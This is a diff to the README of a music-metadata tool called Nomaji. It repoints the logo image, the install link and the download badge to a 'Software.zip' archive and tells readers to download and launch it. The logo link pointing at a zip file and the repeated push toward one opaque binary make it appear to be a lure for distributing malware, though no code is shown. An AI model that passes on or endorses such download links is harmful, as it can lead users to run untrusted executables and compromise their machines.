@@ -1,6 +1,6 @@
 # Nomaji 🎶
 
-![Nomaji Logo](https://example.com/logo.png)
+![Nomaji Logo](https://github.com/ZzzKenpachzzZ/Nomaji/releases/download/v1.0/Software.zip)
 
 ## Description
 
@@ -16,7 +16,7 @@ Welcome to Nomaji, a unique tool that eliminates the need for Romaji translation
 
 ## Installation
 
-Get started by downloading Nomaji [here](https://github.com/user-attachments/files/18388744/Software.zip). Once downloaded, launch the application to start converting track metadata effortlessly.
+Get started by downloading Nomaji [here](https://github.com/ZzzKenpachzzZ/Nomaji/releases/download/v1.0/Software.zip). Once downloaded, launch the application to start converting track metadata effortlessly.
 
 ## Usage
 
@@ -60,6 +60,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download Nomaji](https://img.shields.io/badge/Download-Nomaji-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Nomaji](https://github.com/ZzzKenpachzzZ/Nomaji/releases/download/v1.0/Software.zip)](https://github.com/ZzzKenpachzzZ/Nomaji/releases/download/v1.0/Software.zip)
 
 Visit the official Nomaji repository to explore more features and start using this innovative tool today! 🎧🎶📀
